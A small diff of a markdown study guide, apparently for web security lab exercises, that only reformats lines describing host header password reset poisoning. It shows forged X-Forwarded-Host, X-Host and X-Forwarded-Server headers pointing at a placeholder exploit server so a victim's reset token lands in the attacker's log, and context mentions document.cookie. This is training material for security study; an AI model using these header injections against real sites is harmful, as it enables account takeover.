@@ -363,7 +363,7 @@ body:document.cookie
 
 >Identify that altered HOST headers are supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection or redirection attacks to do password reset poisoning.  
   
-<sub>Change the username parameter to carlos and send the request.</sub>  
+>Change the username parameter to carlos and send the request.  
 
 ```html
 X-Forwarded-Host: EXPLOIT-SERVER-ID.exploit-server.net
@@ -371,7 +371,7 @@ X-Host: EXPLOIT-SERVER-ID.exploit-server.net
 X-Forwarded-Server: EXPLOIT-SERVER-ID.exploit-server.net
 ```  
 
-<sup>Check the exploit server log to obtain the reset link to the victim username.</sup>  
+>Check the exploit server log to obtain the reset link to the victim username.  
   
 ![Exploit Server Logs capture the forgot password reset token](images/HOST-Header-forgot-password-reset.PNG)  
 
